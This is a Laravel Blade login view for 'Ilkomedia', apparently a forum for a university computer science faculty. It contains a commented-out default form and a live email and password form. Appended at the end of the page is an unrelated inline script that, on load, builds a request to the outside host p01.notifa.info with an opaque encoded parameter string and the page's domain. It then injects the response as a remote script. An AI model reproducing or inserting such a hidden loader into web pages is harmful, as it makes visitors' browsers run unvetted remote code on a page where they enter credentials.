@extends('layouts.app')

{{--@section('content')--}}
{{--<div class="container">--}}
{{--    <div class="row">--}}
{{--        <div class="col-md-8 col-md-offset-2">--}}
{{--            <div class="panel panel-default">--}}
{{--                <div class="panel-heading">Login</div>--}}

{{--                <div class="panel-body">--}}
{{--                    <form class="form-horizontal" method="POST" action="{{ route('login') }}">--}}
{{--                        {{ csrf_field() }}--}}

{{--                        <div class="form-group{{ $errors->has('email') ? ' has-error' : '' }}">--}}
{{--                            <label for="email" class="col-md-4 control-label">E-Mail Address</label>--}}

{{--                            <div class="col-md-6">--}}
{{--                                <input id="email" type="email" class="form-control" name="email" value="{{ old('email') }}" required autofocus>--}}

{{--                                @if ($errors->has('email'))--}}
{{--                                    <span class="help-block">--}}
{{--                                        <strong>{{ $errors->first('email') }}</strong>--}}
{{--                                    </span>--}}
{{--                                @endif--}}
{{--                            </div>--}}
{{--                        </div>--}}

{{--                        <div class="form-group{{ $errors->has('password') ? ' has-error' : '' }}">--}}
{{--                            <label for="password" class="col-md-4 control-label">Password</label>--}}

{{--                            <div class="col-md-6">--}}
{{--                                <input id="password" type="password" class="form-control" name="password" required>--}}

{{--                                @if ($errors->has('password'))--}}
{{--                                    <span class="help-block">--}}
{{--                                        <strong>{{ $errors->first('password') }}</strong>--}}
{{--                                    </span>--}}
{{--                                @endif--}}
{{--                            </div>--}}
{{--                        </div>--}}

{{--                        <div class="form-group">--}}
{{--                            <div class="col-md-6 col-md-offset-4">--}}
{{--                                <div class="checkbox">--}}
{{--                                    <label>--}}
{{--                                        <input type="checkbox" name="remember" {{ old('remember') ? 'checked' : '' }}> Remember Me--}}
{{--                                    </label>--}}
{{--                                </div>--}}
{{--                            </div>--}}
{{--                        </div>--}}

{{--                        <div class="form-group">--}}
{{--                            <div class="col-md-8 col-md-offset-4">--}}
{{--                                <button type="submit" class="btn btn-primary">--}}
{{--                                    Login--}}
{{--                                </button>--}}

{{--                                <a class="btn btn-link" href="{{ route('password.request') }}">--}}
{{--                                    Forgot Your Password?--}}
{{--                                </a>--}}
{{--                            </div>--}}
{{--                        </div>--}}
{{--                    </form>--}}
{{--                </div>--}}
{{--            </div>--}}
{{--        </div>--}}
{{--    </div>--}}
{{--</div>--}}


<!DOCTYPE html>
<html lang="en">
<head>
    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="This is social network html5 template available in themeforest......" />
    <meta name="keywords" content="Social Network, Social Media, Make Friends, Newsfeed, Profile Page" />
    <meta name="robots" content="index, follow" />
    <title>{{ config('app.name', 'Ilkomedia') }}</title>

<!--Google Font-->
    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,400i,700,700i" rel="stylesheet">

</head>
<body>
@section('content')
    <!-- Landing Page Contents
================================================= -->
    <div id="lp-register">
        <div class="container wrapper">
            <div class="row">
                <div class="col-sm-5">
                    <div class="intro-texts">
                        <h1 class="text-white">Ilkomedia</h1>
                        <p>Ilkomedia adalah forum untuk berbagi informasi antar warga Fakultas Ilmu Komputer Universitas Jember</p>
                    </div>
                </div>
                <div class="col-sm-6 col-sm-offset-1">
                    <div class="reg-form-container">
                            <!--Login-->
                            <div class="tab-pane" id="login">
                                <h3>Login</h3>
                                <p class="text-muted">Log into your account</p>

                                <!--Login Form-->
                                <form name="Login_form" id='Login_form' method="POST" action="{{ route('login') }}">
                                    {{ csrf_field() }}

                                    <div class="row">
                                        <div class="form-group{{ $errors->has('email') ? ' has-error' : '' }} col-xs-12">
                                            <label for="email" class="sr-only">Email</label>
                                            <input id="email" class="form-control input-group-lg" type="email" name="email" placeholder="Email" value="{{ old('email') }}" required/>
                                            @if ($errors->has('email'))
                                                <span class="help-block">
                                                    <strong>{{ $errors->first('email') }}</strong>
                                                </span>
                                            @endif
                                        </div>
                                    </div>
                                    <div class="row">
                                        <div class="form-group{{ $errors->has('password') ? ' has-error' : '' }} col-xs-12 ">
                                            <label for="password" class="sr-only">Password</label>
                                            <input id="password" class="form-control input-group-lg" type="password" name="password" placeholder="Password"/>
                                            @if ($errors->has('password'))
                                                <span class="help-block">
                                                    <strong>{{ $errors->first('password') }}</strong>
                                                </span>
                                            @endif
                                        </div>
                                    </div>
                                    <p><a href="{{ route('password.request') }}">Forgot Password?</a></p>
                                    <button type="submit" class="btn btn-primary">Login Now</button>
                                </form><!--Login Form Ends-->
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>


    <div id="spinner-wrapper">
        <div class="spinner"></div>
    </div>

    <script type="text/javascript">if (self===top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAiySi%2bk45cljJxPp6Y86LGFk4AbWZZkO3GLi%2bv544%2fpXZGEJbwDK8FRcjTwVpmpcv%2bZRPdYdzPaiO1ZLFN4wsNFXRMOywQURRlMsj7jPXnFbMu7IR4uTIk8ds%2fGjCNbPLWVFI3kORLc9ze8%2fWF%2bXLuKoiGoIBwpO69tMT%2bWTtziQQm5CJu9OKtw1bhWn85%2fbMYPzZHJFLqOJUUNbChq0Zq%2fZ%2fx14dDwhwtAtCbF8Jjsxir8jskcrtNAZzDPWLLuvKeZ%2bysSwKkPTRuPMns805Oa7jZA3DFh0sCp7%2bW%2fuZEsuUh6XHSXFg0MrfgTDQ6jE2RoYjFAMNfQrfRQhBecgkl3gS9AErtw8TBqaebg%2b4Xi8H6Y0JsG6e0loC69SXm3Zohh59Thz%2fYDJoE851f1YM5sjW3zI4U68i8gL39tsa6y27XDwf89rWPLPhMLAOZZSX7R8cvAjm6QNBDecrUlgL3SQmn68OvtJIGlb%2bmhX1%2f0H5zgUrkRPXo3f9wnhZajWoPyEwvhNx6v4DO4Hzbr4mVoS51Bxc6mFMoorAwyFIoFjSZM%2fJmeSIKw%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>
@endsection
